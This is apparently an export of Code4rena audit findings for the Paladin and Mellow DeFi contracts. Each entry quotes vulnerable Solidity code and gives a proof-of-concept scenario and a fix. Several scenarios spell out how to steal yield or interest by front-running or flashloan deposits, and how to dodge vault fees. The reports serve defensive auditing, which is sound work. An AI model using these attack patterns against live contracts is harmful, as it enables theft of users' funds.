In the smart contract deployed by user A, user B first needs to transfer 100 tokens to user A. In the \_getNewReceiverCooldown function, \_senderCooldown is Day 15 and receiverCooldown is Day 0, so the latest cooldown of user A is (100 \* Day 15 + 200 \* Day 0)/(100+200) = Day 5.

        function _getNewReceiverCooldown(
            uint256 senderCooldown,
            uint256 amount,
            address receiver,
            uint256 receiverBalance
        ) internal view returns(uint256) {
            uint256 receiverCooldown = cooldowns[receiver];

            // If receiver has no cooldown, no need to set a new one
            if(receiverCooldown == 0) return 0;

            uint256 minValidCooldown = block.timestamp - (COOLDOWN_PERIOD + UNSTAKE_PERIOD);

            // If last receiver cooldown is expired, set it back to 0
            if(receiverCooldown < minValidCooldown) return 0;

            // In case the given senderCooldown is 0 (sender has no cooldown, or minting)
            uint256 _senderCooldown = senderCooldown < minValidCooldown ? block.timestamp : senderCooldown;

            // If the sender cooldown is better, we keep the receiver cooldown
            if(_senderCooldown < receiverCooldown) return receiverCooldown;

            // Default new cooldown, weighted average based on the amount and the previous balance
            return ((amount * _senderCooldown) + (receiverBalance * receiverCooldown)) / (amount + receiverBalance);

        }

Since User A is still at UNSTAKE_PERIOD after receiving the tokens, User A unstakes 100 tokens and sends it to User B.

After calculation, we found that when user A has a balance of X and is at the edge of UNSTAKE_PERIOD, user A can assist in unstaking the X/2 amount of tokens just staked.

### Proof of Concept

[HolyPaladinToken.sol#L1131](https://github.com/code-423n4/2022-03-paladin/blob/main/contracts/HolyPaladinToken.sol#L1131)

### Recommended Mitigation Steps

After calculation, we found that the number of tokens that users at the edge of UNSTAKE_PERIOD can assist in unstaking conforms to the following equation
UNSTAKE_PERIOD/COOLDOWN_PERIOD = UNSTAKE_AMOUNT/USER_BALANCE, when COOLDOWN_PERIOD remains unchanged, the smaller the UNSTAKE_PERIOD, the less tokens the user can assist in unstaking, so UNSTAKE_PERIOD can be adjusted to alleviate this situation.




***"
105.md,`cooldown` is set to 0 when the user sends all tokens to himself,medium,"In the \_beforeTokenTransfer function, cooldowns will be set to 0 when the user transfers all tokens to himself.<br>
Consider the following scenario:<br>
Day 0: The user stakes 100 tokens and calls the cooldown function.<br>
Day 10: the user wanted to unstake the tokens, but accidentally transferred all the tokens to himself, which caused the cooldown to be set to 0 and the user could not unstake.

### Proof of Concept

[HolyPaladinToken.sol#L891-L905](https://github.com/code-423n4/2022-03-paladin/blob/main/contracts/HolyPaladinToken.sol#L891-L905)

### Recommended Mitigation Steps

      function _beforeTokenTransfer(
          address from,
          address to,
          uint256 amount
      ) internal virtual override {
          if(from != address(0)) { //check must be skipped on minting
              // Only allow the balance that is unlocked to be transfered
              require(amount <= _availableBalanceOf(from), ""hPAL: Available balance too low"");
          }

          // Update user rewards before any change on their balance (staked and locked)
          _updateUserRewards(from);

          uint256 fromCooldown = cooldowns[from]; //If from is address 0x00...0, cooldown is always 0

          if(from != to) {
              // Update user rewards before any change on their balance (staked and locked)
              _updateUserRewards(to);
              // => we don't want a self-transfer to double count new claimable rewards
              // + no need to update the cooldown on a self-transfer

              uint256 previousToBalance = balanceOf(to);
              cooldowns[to] = _getNewReceiverCooldown(fromCooldown, amount, to, previousToBalance);
              // If from transfer all of its balance, reset the cooldown to 0
              uint256 previousFromBalance = balanceOf(from);
              if(previousFromBalance == amount && fromCooldown != 0) {
                  cooldowns[from] = 0;
              }
          }
      }





***"
105.md,Past state query results are susceptible to manipulation due to multiple states with same block number,medium,"[HolyPaladinToken.sol#L466](https://github.com/code-423n4/2022-03-paladin/blob/main/contracts/HolyPaladinToken.sol#L466)<br>
[HolyPaladinToken.sol#L492](https://github.com/code-423n4/2022-03-paladin/blob/main/contracts/HolyPaladinToken.sol#L492)<br>
[HolyPaladinToken.sol#L644](https://github.com/code-423n4/2022-03-paladin/blob/main/contracts/HolyPaladinToken.sol#L644)<br>
[HolyPaladinToken.sol#L663](https://github.com/code-423n4/2022-03-paladin/blob/main/contracts/HolyPaladinToken.sol#L663)<br>
[HolyPaladinToken.sol#L917](https://github.com/code-423n4/2022-03-paladin/blob/main/contracts/HolyPaladinToken.sol#L917)<br>
[HolyPaladinToken.sol#L961](https://github.com/code-423n4/2022-03-paladin/blob/main/contracts/HolyPaladinToken.sol#L961)<br>
[HolyPaladinToken.sol#L993](https://github.com/code-423n4/2022-03-paladin/blob/main/contracts/HolyPaladinToken.sol#L993)<br>
[HolyPaladinToken.sol#L1148](https://github.com/code-423n4/2022-03-paladin/blob/main/contracts/HolyPaladinToken.sol#L1148)<br>
[HolyPaladinToken.sol#L1164](https://github.com/code-423n4/2022-03-paladin/blob/main/contracts/HolyPaladinToken.sol#L1164)<br>
[HolyPaladinToken.sol#L1184](https://github.com/code-423n4/2022-03-paladin/blob/main/contracts/HolyPaladinToken.sol#L1184)<br>
[HolyPaladinToken.sol#L1199](https://github.com/code-423n4/2022-03-paladin/blob/main/contracts/HolyPaladinToken.sol#L1199)<br>
[HolyPaladinToken.sol#L1225](https://github.com/code-423n4/2022-03-paladin/blob/main/contracts/HolyPaladinToken.sol#L1225)<br>
[HolyPaladinToken.sol#L1250](https://github.com/code-423n4/2022-03-paladin/blob/main/contracts/HolyPaladinToken.sol#L1250)<br>
[HolyPaladinToken.sol#L1260](https://github.com/code-423n4/2022-03-paladin/blob/main/contracts/HolyPaladinToken.sol#L1260)<br>
[HolyPaladinToken.sol#L1287](https://github.com/code-423n4/2022-03-paladin/blob/main/contracts/HolyPaladinToken.sol#L1287)<br>
[HolyPaladinToken.sol#L1293](https://github.com/code-423n4/2022-03-paladin/blob/main/contracts/HolyPaladinToken.sol#L1293)<br>
[HolyPaladinToken.sol#L1324](https://github.com/code-423n4/2022-03-paladin/blob/main/contracts/HolyPaladinToken.sol#L1324)<br>
[HolyPaladinToken.sol#L1352](https://github.com/code-423n4/2022-03-paladin/blob/main/contracts/HolyPaladinToken.sol#L1352)<br>
[HolyPaladinToken.sol#L1357](https://github.com/code-423n4/2022-03-paladin/blob/main/contracts/HolyPaladinToken.sol#L1357)<br>

4 kinds of states (`UserLock`, `TotalLock`, `Checkpoint`, `DelegateCheckpoint`) are maintained in the protocol to keep record of history. For functions that query history states, target block number is used as an index to search for the corresponding state.

However, 3 (`DelegateCheckpoint`, `TotalLock`, `UserLocks`) out of the 4 states are allowed to have multiple entries with same `fromBlock`, resulting in a one-to-many mapping between block number and history entry. This makes queried results at best imprecise, and at worst manipulatable by malicious users to present an incorrect history.

### Proof of Concept

Functions that query history states including `_getPastLock`, `getPastTotalLock`, `_getPastDelegate` perform a binary search through the array of history states to find entry matching queried block number. However, the searched arrays can contain multiple entries with the same `fromBlock`.

For example the `_lock` function pushes a new `UserLock` to `userLocks[user]` regardless of previous lock block number.

        function _lock(address user, uint256 amount, uint256 duration, LockAction action) internal {
            require(user != address(0)); //Never supposed to happen, but security check
            require(amount != 0, ""hPAL: Null amount"");
            uint256 userBalance = balanceOf(user);
            require(amount <= userBalance, ""hPAL: Amount over balance"");
            require(duration >= MIN_LOCK_DURATION, ""hPAL: Lock duration under min"");
            require(duration <= MAX_LOCK_DURATION, ""hPAL: Lock duration over max"");

            if(userLocks[user].length == 0){
                ...
            }
            else {
                // Get the current user Lock
                uint256 currentUserLockIndex = userLocks[user].length - 1;
                UserLock storage currentUserLock = userLocks[user][currentUserLockIndex];
                // Calculate the end of the user current lock
                uint256 userCurrentLockEnd = currentUserLock.startTimestamp + currentUserLock.duration;

                uint256 startTimestamp = block.timestamp;

                if(currentUserLock.amount == 0 || userCurrentLockEnd < block.timestamp) {
                    // User locked, and then unlocked
                    // or user lock expired

                    userLocks[user].push(UserLock(
                        safe128(amount),
                        safe48(startTimestamp),
                        safe48(duration),
                        safe32(block.number)
                    ));
                }
                else {
                    // Update of the current Lock : increase amount or increase duration
                    // or renew with the same parameters, but starting at the current timestamp
                    require(amount >=  currentUserLock.amount,""hPAL: smaller amount"");
                    require(duration >=  currentUserLock.duration,""hPAL: smaller duration"");

                    // If the method is called with INCREASE_AMOUNT, then we don't change the startTimestamp of the Lock

                    userLocks[user].push(UserLock(
                        safe128(amount),
                        action == LockAction.INCREASE_AMOUNT ? currentUserLock.startTimestamp : safe48(startTimestamp),
                        safe48(duration),
                        safe32(block.number)
                    ));
                    ...
                }
            ...
        }

This makes the history searches imprecise at best. Additionally, if a user intends to shadow his past states from queries through public search functions, it is possible to control the number of entries precisely such that binsearch returns the entry he wants to show.

### Tools Used

vim, ganache-cli

### Recommended Mitigation Steps

Adopt the same strategy as checkpoint, and modify last entry in array instead of pushing new one if it `fromBlock == block.number`.





***"
105.md,`PaladinRewardReserve.sol` may have potential bugs if it uses new tokens as rewards,medium,"`PaladinRewardReserve.sol` may have potential bugs if it uses new tokens as rewards.

### Proof of Concept

Currently, `PaladinRewardReserve.sol` has following behaviors:

*   `mapping(address => bool) public approvedSpenders` does not store the info regarding which token it targets
*   `setNewSpender`, `updateSpenderAllowance`, `removeSpender` and `transferToken` functions can set `token` arbitrarily

Hence, some corner cases may happen as follows:

*   Use TokenA at PaladinRewardReserve.sol and do operations.
*   Start TokenB as rewards at PaladinRewardReserve.sol.
*   All the information stored in `approvedSpenders` was intended for TokenA. So it is possible that following corner cases happen:
    *   `setNewSpender` function cannot set new token
    *   If userA is already added in `approvedSpenders` for TokenA, it can call `updateSpenderAllowance`.

### Recommended Mitigation Steps

Do either of followings depending on the product specification:

(1) If PAL token is only used and other token will never be used at `PaladinRewardReserve.sol`, stop having `address token` argument at `setNewSpender`, `updateSpenderAllowance`, `removeSpender` and `transferToken` functions. Instead, set `token` at the constructor or other ways, and limit the ability to flexibly set `token` from functions.

(2) If other tokens potentially will be used at `PaladinRewardReserve.sol`, update data structure of `approvedSpenders` mapping and change the logic.
Firstly, it should also contain the info which `token` it targets such as `mapping(address => address => bool)`.
Secondly, it should rewrite the `require` logic at each function as follows.

    require(!approvedSpenders[spender][token], ""Already Spender on the specified Token"");

<!---->

    require(approvedSpenders[spender][token], ""Not approved Spender on the specified Token"");




***"
105.md,Updating the state,medium,"In the Emergency withdraw function  userCurrentBonusRatio and  durationRatio aren't update which will user clime funds with the wrong ratio.

### Proof of Concept

[HolyPaladinToken.sol#L1338](https://github.com/code-423n4/2022-03-paladin/blob/9c26ec8556298fb1dc3cf71f471aadad3a5c74a0/contracts/HolyPaladinToken.sol#L1338)

### Recommended Mitigation Steps

Set these variables to zero in the EmergencyWithdraw function.





***"
105.md,Add a timelock to `PaladinRewardReserve` functions,medium,"The owner of PaladinRewardReserve can approve and transfer any amount of tokens with no limits on any account. This is not good for investors. To give more trust to users: these functions should be put behind a timelock.

### Proof of Concept

[PaladinRewardReserve.sol#L28](https://github.com/code-423n4/2022-03-paladin/blob/9c26ec8556298fb1dc3cf71f471aadad3a5c74a0/contracts/PaladinRewardReserve.sol#L28)<br>

[PaladinRewardReserve.sol#L52](https://github.com/code-423n4/2022-03-paladin/blob/9c26ec8556298fb1dc3cf71f471aadad3a5c74a0/contracts/PaladinRewardReserve.sol#L52)<br>

### Tools Used

VS Code

### Recommended Mitigation Steps

Add a timelock to transfer and spender approved functions.




***"
105.md,Function `cooldown()` is not protected when protocol in emergency mode,medium,"[HolyPaladinToken.sol#L228-L235](https://github.com/code-423n4/2022-03-paladin/blob/9c26ec8556298fb1dc3cf71f471aadad3a5c74a0/contracts/HolyPaladinToken.sol#L228-L235)<br>

Function cooldown() is not protected when protocol is in emergency mode.<br>
Its behavior is not consistent with the other major functions defined.

### Impact

While other major functions like stake, unstake, lock, unlock, etc., of this contract is protected by checking for emergency flag and reverting,
this function cooldown() is not checked. The impact of this is that during emergency mode, users can set immediately the cooldown() and plan for unstaking when the emergency mode is lifted and cooldown period expires. This may not be the desirable behaviour expected by the protocol.

### Proof of Concept

Contract Name : HolyPaladinToken.sol
Function cooldown()

### Recommended Mitigation Steps

Add checking for emergency mode for this function also.

    if(emergency) revert EmergencyBlock();




***"
105.md,`UserLock` information can be found during emergency mode,medium,"[HolyPaladinToken.sol#L446-L468](https://github.com/code-423n4/2022-03-paladin/blob/9c26ec8556298fb1dc3cf71f471aadad3a5c74a0/contracts/HolyPaladinToken.sol#L446-L468)<br>

When the contract is in blocked state (emergency mode), the protocol wants to return an empty UserLock info, on calling the function getUserLock.
However, there is another way, by which the users can find the same information.

The below function is not protected when in emergency mode, and users can use this alternatively.
Line#466 function getUserPastLock(address user, uint256 blockNumber)

### Impact

There is no loss of funds, however the intention to block information (return empty lock info) is defeated, because not all functions are protected.<br>
There is inconsistency in implementing the emergency mode check.

### Proof of Concept

Contract Name : HolyPaladinToken.sol<br>
Functions getUserLock and getUserPastLock

### Recommended Mitigation Steps

Add checking for emergency mode for this function getUserPastLock.

    if(emergency) revert EmergencyBlock();

Additional user access check can be added, so that the function returns correct value when the caller(msg.sender) is admin or owner.




***"
105.md,Emergency mode enable/disable issue,medium,"Enabling emergency mode should be one way process that sets contract(s) in emergency mode. It should be not possible to revert that process, otherwise it puts owner of the contract(s) in very privileged position. Owner can trigger emergency mode, perform emergency withdrawal operations without any restrictions and then disable emergency mode.

### Proof of Concept

[HolyPaladinToken.sol#L1425](https://github.com/code-423n4/2022-03-paladin/blob/9c26ec8556298fb1dc3cf71f471aadad3a5c74a0/contracts/HolyPaladinToken.sol#L1425)

### Recommended Mitigation Steps

It is recommended to remove `bool trigger` parameter from `triggerEmergencyWithdraw` function and set `emergency` to `true` after successfully executing function.




***"
105.md,Users with large `cooldown`s can grief other users,medium,"If an account has a large cooldown, that account can grief other accounts that are waiting for their own cooldowns, by sending small amounts to them.

### Proof of Concept

Every transfer to an account increases the cooldown

```solidity
    /** @dev Hook called before any transfer */
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual override {
        if(from != address(0)) { //check must be skipped on minting
            // Only allow the balance that is unlocked to be transfered
            require(amount <= _availableBalanceOf(from), ""hPAL: Available balance too low"");
        }

        // Update user rewards before any change on their balance (staked and locked)
        _updateUserRewards(from);

        uint256 fromCooldown = cooldowns[from]; //If from is address 0x00...0, cooldown is always 0 

        if(from != to) {
            // Update user rewards before any change on their balance (staked and locked)
            _updateUserRewards(to);
            // => we don't want a self-transfer to double count new claimable rewards
            // + no need to update the cooldown on a self-transfer

            uint256 previousToBalance = balanceOf(to);
            cooldowns[to] = _getNewReceiverCooldown(fromCooldown, amount, to, previousToBalance);
        }
```

[HolyPaladinToken.sol#L875-L899](https://github.com/code-423n4/2022-03-paladin/blob/9c26ec8556298fb1dc3cf71f471aadad3a5c74a0/contracts/HolyPaladinToken.sol#L875-L899)<br>

The amount of the increase is proportional to the sender's cooldown:

```solidity
        // Default new cooldown, weighted average based on the amount and the previous balance
        return ((amount * _senderCooldown) + (receiverBalance * receiverCooldown)) / (amount + receiverBalance);
```

[HolyPaladinToken.sol#L1130-L1131](https://github.com/code-423n4/2022-03-paladin/blob/9c26ec8556298fb1dc3cf71f471aadad3a5c74a0/contracts/HolyPaladinToken.sol#L1130-L1131)<br>

### Recommended Mitigation Steps

Only allow a total of one cooldown increase when the sender is not the recipient.





***"
105.md,Users Can Bypass Emergency Restrictions on `updateUserRewardState()`,medium,"[HolyPaladinToken.sol#L1338-L1378](https://github.com/code-423n4/2022-03-paladin/blob/main/contracts/HolyPaladinToken.sol#L1338-L1378)<br>
[HolyPaladinToken.sol#L876-L906](https://github.com/code-423n4/2022-03-paladin/blob/main/contracts/HolyPaladinToken.sol#L876-L906)

The `emergencyWithdraw()` function intends to withdraw their tokens regardless if they are locked up for any duration. This emergency must be triggered by the owner of the contract by calling `triggerEmergencyWithdraw()`. A number of functions will revert when the protocol is in an emergency state, including all stake, lock, unlock and kick actions and the updating of a user's rewards. However, a user could bypass the restriction on `_updateUserRewards()` by transferring a small amount of unlocked tokens to their account. `_beforeTokenTransfer()` will call `_updateUserRewards()` on the `from` and `to` accounts. As a result, users can continue to accrue rewards while the protocol is in an emergency state and it makes sense for users to delay their emergency withdraw as they will be able to claim a higher proportion of the allocated rewards.

### Recommended Mitigation Steps

Consider adding a check for the boolean `emergency` value in `_beforeTokenTransfer()` to not call `_updateUserRewards` on any account if this value is set. Alternatively, a check could be added into the `_updateUserRewards()` function to return if `emergency` is true.




***"
105.md,Increasing the Lock Amount on an Expired Lock Will Cause Users to Miss Out on Rewards,medium,"[HolyPaladinToken.sol#L284-L294](https://github.com/code-423n4/2022-03-paladin/blob/main/contracts/HolyPaladinToken.sol#L284-L294)<br>
[HolyPaladinToken.sol#L1137-L1233](https://github.com/code-423n4/2022-03-paladin/blob/main/contracts/HolyPaladinToken.sol#L1137-L1233)

Paladin protocol allows users to increase the amount or duration of their lock while it is stil active. Increasing the amount of an active lock should only increase the total locked amount and it shouldn't make any changes to the associated bonus ratios as the duration remains unchanged.

However, if a user increases the lock amount on an expired lock, a new lock will be created with the duration of the previous lock and the provided non-zero amount. Because the `action != LockAction.INCREASE_AMOUNT` check later on in the function does not hold true, `userCurrentBonusRatio` will contain the last updated value from the previous lock. As a result, the user will not receive any rewards for their active lock and they will need to increase the duration of the lock to fix lock's bonus ratio.

### Recommended Mitigation Steps

Consider preventing users from increasing the amount on an expired lock. This should help to mitigate this issue.




***"
58.md,`YearnVault.sol#pull()` will most certainly fail,high,"<https://github.com/code-423n4/2021-12-mellow/blob/6679e2dd118b33481ee81ad013ece4ea723327b5/mellow-vaults/test_brownie/contracts/YearnVault.sol#L84-L101>

```solidity
    for (uint256 i = 0; i < _yTokens.length; i++) {
        if (tokenAmounts[i] == 0) {
            continue;
        }

        IYearnVault yToken = IYearnVault(_yTokens[i]);
        uint256 yTokenAmount = ((tokenAmounts[i] * (10**yToken.decimals())) / yToken.pricePerShare());
        uint256 balance = yToken.balanceOf(address(this));
        if (yTokenAmount > balance) {
            yTokenAmount = balance;
        }
        if (yTokenAmount == 0) {
            continue;
        }
        yToken.withdraw(yTokenAmount, to, maxLoss);
        (tokenAmounts[i], address(this));
    }
    actualTokenAmounts = tokenAmounts;
```

The actual token withdrew from `yToken.withdraw()` will most certainly be less than the `tokenAmounts[i]`, due to precision loss in the calculation of `yTokenAmount`.

As a result, `IERC20(_vaultTokens[i]).safeTransfer(to, actualTokenAmounts[i]);` in `LpIssuer.sol#withdraw()` will revert due to insufficant balance.

#### Recommendation

Change to:

```solidity
tokenAmounts[i] = yToken.withdraw(yTokenAmount, to, maxLoss);
```


 > 
 > so fund loss is related to not being able to withdraw rather than by extracting value from the protocol


 > Let's use an example:
> 
> - Alice calls `LpIssuer.withdraw()` with `tokensAmount[0]` equal to 100 tokens. Let's ignore the `lpTokenAmount` argument for the sake of this example.
> - `_subvault().pull` is called on this `tokensAmount[0]`.
> - `yTokenAmount` is calculated according to `((tokenAmounts[i] * (10**yToken.decimals())) / yToken.pricePerShare());` which potentially leads to a slightly truncated output.
> - This truncated output represents the shares belonging to the user which is then parsed to `yToken.withdraw()`.
> - `yToken.withdraw()` is likely less than 100 tokens and is sent to the `LpIssuer.sol` contract but `actualTokenAmounts[0]` is equal to 100 tokens.
> - `LpIssuer.withdraw()` attempts to send tokens to the withdrawer but is unable as the contract does not have sufficient balance. `IERC20(_vaultTokens[i]).safeTransfer(to, actualTokenAmounts[i]);`
> - If I'm not mistaken, it seems like this issue would be apparent on any withdrawal amount (assuming there is some amount truncated).
> - There is also an important edge case where the amount to withdraw from the yearn vault is greater than the available contract balance, it will always revert."
58.md,Wrong implementation of `performanceFee` can cause users to lose 50% to 100% of their funds,high,"A certain amount of lp tokens (shares of the vault) will be minted to the `strategyPerformanceTreasury` as `performanceFee`, the amount is calculated based on the `minLpPriceFactor`.

However, the current formula for `toMint` is wrong, which issues more than 100% of the current totalSupply of the lp token to the `strategyPerformanceTreasury` each time. Causing users to lose 50% to 100% of their funds after a few times.

<https://github.com/code-423n4/2021-12-mellow/blob/6679e2dd118b33481ee81ad013ece4ea723327b5/mellow-vaults/contracts/LpIssuer.sol#L269-L271>

```solidity
address treasury = strategyParams.strategyPerformanceTreasury;
uint256 toMint = (baseSupply * minLpPriceFactor) / CommonLibrary.DENOMINATOR;
_mint(treasury, toMint);
```

#### Proof of Concept

Given:

*   `strategyParams.performanceFee`: `10e7` (1%)

1.  Alice deposited `1,000 USDC`, received `1000` lpToken; the totalSupply of the lpToken is now: `1000`;
2.  3 days later, `baseTvl` increased to `1,001 USDC`, Bob deposited `1 USDC` and trigegred `_chargeFees()`:

*   Expected Result: `strategyPerformanceTreasury` to receive about `0.01` lpToken (1% of 1 USDC);
*   Actual Result: `minLpPriceFactor` is about `1.001`, and `strategyPerformanceTreasury` will received `1001` lpToken as performanceFee; Alice lose 50% of deposited funds.

#### Recommendation

Change to:

```solidity
address treasury = strategyParams.strategyPerformanceTreasury;
uint256 toMint = (baseSupply * (minLpPriceFactor - CommonLibrary.DENOMINATOR) * performanceFee  / CommonLibrary.DENOMINATOR) / CommonLibrary.DENOMINATOR;
_mint(treasury, toMint);
```"
58.md,`UniV3Vault.sol#collectEarnings()` can be front run,high,"For `UniV3Vault`, it seems that lp fees are collected through `collectEarnings()` callable by the `strategy` and reinvested (rebalanced).

However, in the current implementation, unharvested yields are not included in `tvl()`, making it vulnerable to front-run attacks that steal pending yields.

- <https://github.com/code-423n4/2021-12-mellow/blob/6679e2dd118b33481ee81ad013ece4ea723327b5/mellow-vaults/contracts/UniV3Vault.sol#L100-L122>

- <https://github.com/code-423n4/2021-12-mellow/blob/6679e2dd118b33481ee81ad013ece4ea723327b5/mellow-vaults/contracts/UniV3Vault.sol#L80-L97>

#### Proof Of Concept

Given:

*   Current `tvl()` is `10 ETH` and `40,000 USDC`;
*   Current unclaimed yields (trading fees) is `1 ETH` and `4,000 USDC`;

1.  `strategy` calls `collectEarnings()` to collect fees and reinvest;
2.  The attacker sends a deposit tx with a higher gas price to deposit `10 ETH` and `40,000 USDC`, take 50% share of the pool;
3.  After the transaction in step 1 is packed, the attacker calls `withdraw()` and retrieves `10.5 ETH` and `42,000 USDC`.

As a result, the attacker has stolen half of the pending yields in about 1 block of time.

#### Recommendation

Consider including fees in `tvl()`.

For the code to calculate fees earned, please reference `_computeFeesEarned()` in G-UNI project:

- <https://github.com/gelatodigital/g-uni-v1-core/blob/master/contracts/GUniPool.sol#L762-L806>"
58.md,AaveVault does not update TVL on deposit/withdraw,high,"Aave uses **rebasing** tokens which means the token balance `aToken.balanceOf(this)` increases over time with the accrued interest.

The `AaveVault.tvl` uses a cached value that needs to be updated using a `updateTvls` call.

This call is not done when depositing tokens which allows an attacker to deposit tokens, get a fair share *of the old tvl*, update the tvl to include the interest, and then withdraw the LP tokens receiving a larger share of the *new tvl*, receiving back their initial deposit + the share of the interest.
This can be done risk-free in a single transaction.

#### Proof Of Concept

*   Imagine an Aave Vault with a single vault token, and current TVL = `1,000 aTokens`
*   Attacker calls `LPIssuer.push([1000])`. This loads the old, cached `tvl`. No `updateTvl` is called.
*   The `1000` underlying tokens are already balanced as there's only one aToken, then the entire amount is pushed: `aaveVault.transferAndPush([1000])`. This deposists `1000` underlying tokens to the Aave lending pool and returns `actualTokenAmounts = [1000]`. **After that** the internal `_tvls` variable is updated with the latest aTokens. This includes the 1000 aTokens just deposited **but also the new rebased aToken amounts**, the interest the vault received from supplying the tokens since last `updateTvls` call. `_tvls = _tvls + interest + 1000`
*   The LP amount to mint `amountToMint` is still calculated on the old cached `tvl` memory variable, i.e., attacker receives `amount / oldTvl = 1000/1000 = 100%` of existing LP supply
*   Attacker withdraws the LP tokens for 50% of the new TVL (it has been updated in `deposit`'s `transferAndPush` call). Attacker receives `50% * _newTvl = 50% * (2,000 + interest) = 1000 + 0.5 * interest`.
*   Attacker makes a profit of `0.5 * interest`

#### Impact

The interest since the last TVL storage update can be stolen as Aave uses rebasing tokens but the tvl is not first recomputed when depositing.
If the vaults experience low activity a significant amount of interest can accrue which can all be captured by taking a flashloan and depositing and withdrawing a large amount to capture a large share of this interest

#### Recommended Mitigation Steps

Update the tvl when depositing and withdrawing before doing anything else."
58.md,User deposits don't have min. return checks,medium,"The `LPIssuer.deposit` first computes *balanced amounts* on the user's defined `tokenAmounts`.
The idea is that LP tokens give the same percentage share of each vault tokens' tvl, therefore the provided amounts should be *balanced*, meaning, the `depositAmount / tvl` ratio should be equal for all vault tokens.

But the strategist can frontrun the user's deposit and rebalance the vault tokens, changing the tvl for each vault token which changes the rebalance.
This frontrun can happen accidentally whenever the strategist rebalances

#### Proof Of Concept

There's a vault with two tokens A and B, tvls are `[500, 1500]`

*   The user provides `[500, 1500]`, expecting to get 50% of the share supply (is minted 100% of old total supply).
*   The strategist rebalances to `[1000, 1000]`
*   The user's balanceFactor is `min(500/1000, 1500/1000) = 1/2`, their balancedAmounts are thus `tvl * balanceFactor = [500, 500]`, the `1000` excess token B are refunded. In the end, they only received `500/(1000+500) = 33.3%` of the total supply but used up all of their token A which they might have wanted to hold on to if they had known they'd only get 33.3% of the supply.

#### Impact

Users can get rekt when depositing as the received LP amount is unpredictable and lead to a trade using a very different balanced token mix that they never intended.

#### Recommended Mitigation Steps

Add minimum return amount checks.
Accept a function parameter that can be chosen by the user indicating their *expected LP amount* for their deposit `tokenAmounts`, then check that the actually minted LP token amount is above this parameter."
58.md,Withdraw from `AaveVault` will receive less than actual share,medium,"#### Impact

`AaveVault` cache `tvl` and update it at the end of each `_push` and `_pull`. When withdrawing from `LpIssuer`,  `tokenAmounts` is calculated using the cached `tvl` to be pulled from `AaveVault`. This will lead to user missing out their share of the accrued interest / donations to Aave since the last `updateTvls`.

#### Proof of Concept

- <https://github.com/code-423n4/2021-12-mellow/blob/6679e2dd118b33481ee81ad013ece4ea723327b5/mellow-vaults/contracts/LpIssuer.sol#L150>
- <https://github.com/code-423n4/2021-12-mellow/blob/6679e2dd118b33481ee81ad013ece4ea723327b5/mellow-vaults/contracts/AaveVault.sol#L13>

#### Recommended Mitigation Steps

Call `updateTvls` at the beginning of `withdraw` function if the `_subvault` will cache tvl"
58.md,Users can avoid paying vault fees,medium,"The `LPIssuer.deposit/withdraw` function charges protocol\&management\&performance fees through inflating the LP supply in the `_chargeFees` function.
However, this LP fees minting is skipped if the elapsed time is less than the `managementFeeChargeDelay`:

```solidity
if (elapsed < vg.delayedProtocolParams().managementFeeChargeDelay) {
    return;
}
```

This allows a user to avoid paying any fees if they deposit right after a charge fee interaction and withdraw within again `managementFeeChargeDelay` time period.

#### Proof Of Concept

This can be abused heavily on networks where the gas fees are a lot cheaper than the three vault fees:

*   deposit a tiny amount just to trigger the charge fees. This sets `lastFeeCharge`
*   deposit a huge amount, tvl increases significantly
*   let it earn interest. withdraw it before the `managementFeeChargeDelay`. No fees are paid, tvl reduces significantly
*   repeat, fees are only paid on tiny tvl

#### Impact

In the worst case, nobody pays fees by repeating the above actions.

#### Recommended Mitigation Steps

Fees must always be charged on each deposit and withdrawal, even within the same block as it could be that a huge interest ""harvest"" comes in that an attacker sandwiches.
Remove the `if (elapsed < vg.delayedProtocolParams().managementFeeChargeDelay) { return; }` code."
58.md,`ChiefTrader.sol` Wrong implementation of `swapExactInput()` and `swapExactOutput()`,medium,"When a caller calls `ChiefTrader.sol#swapExactInput()`, it will call `ITrader(traderAddress).swapExactInput()`.

<https://github.com/code-423n4/2021-12-mellow/blob/6679e2dd118b33481ee81ad013ece4ea723327b5/mellow-vaults/contracts/trader/ChiefTrader.sol#L59-L59>

```solidity
return ITrader(traderAddress).swapExactInput(0, amount, recipient, path, options);
```

However, in the current implementation, `inputToken` is not approved to the `traderAddress`.

For example, in `UniV3Trader.sol#_swapExactInputSingle`, at L89, it tries to transfer inputToken from `msg.sender` (which is `ChiefTrader`), since it's not approved, this will revert.

Plus, the `inputToken` should also be transferred from the caller before calling the subtrader.

<https://github.com/code-423n4/2021-12-mellow/blob/6679e2dd118b33481ee81ad013ece4ea723327b5/mellow-vaults/contracts/trader/UniV3Trader.sol#L89-L89>

```solidity
IERC20(input).safeTransferFrom(msg.sender, address(this), amount);
```

The same problem exists in `swapExactOutput()`:

<https://github.com/code-423n4/2021-12-mellow/blob/6679e2dd118b33481ee81ad013ece4ea723327b5/mellow-vaults/contracts/trader/ChiefTrader.sol#L63-L75>

```solidity
function swapExactOutput(
    uint256 traderId,
    uint256 amount,
    address,
    PathItem[] calldata path,
    bytes calldata options
) external returns (uint256) {
    require(traderId < _traders.length, TraderExceptionsLibrary.TRADER_NOT_FOUND_EXCEPTION);
    _requireAllowedTokens(path);
    address traderAddress = _traders[traderId];
    address recipient = msg.sender;
    return ITrader(traderAddress).swapExactOutput(0, amount, recipient, path, options);
}
```

#### Recommendation

Approve the `inputToken` to the subtrader and transfer from the caller before calling `ITrader.swapExactInput()` and `ITrader.swapExactOutput()`.

Or maybe just remove support of `swapExactInput()` and `swapExactOutput()` in `ChiefTrader`."
58.md,Admin can break `_numberOfValidTokens`,medium,"The `ProtocolGovernance._numberOfValidTokens` can be decreased by the admin in the `ProtocolGovernance.removeFromTokenWhitelist` function:

```solidity
function removeFromTokenWhitelist(address addr) external {
    require(isAdmin(msg.sender), ""ADM"");
    _tokensAllowed[addr] = false;
    if (_tokenEverAdded[addr]) {
        // @audit admin can repeatedly call this function and sets _numberOfValidTokens to zero. because they don't flip _tokenEverAdded[addr] here
        --_numberOfValidTokens;
    }
}
```

This function can be called repeatedly until the `_numberOfValidTokens` is zero.

#### Impact

The `_numberOfValidTokens` is wrong and with it the `tokenWhitelist()`.

#### Recommended Mitigation Steps

It seems that `_numberOfValidTokens` should only be decreased if the token was previously allowed:

```solidity
function removeFromTokenWhitelist(address addr) external {
    require(isAdmin(msg.sender), ""ADM"");
    if (_tokensAllowed[addr]) {
        _tokensAllowed[addr] = false;
        --_numberOfValidTokens;
    }
}
```"
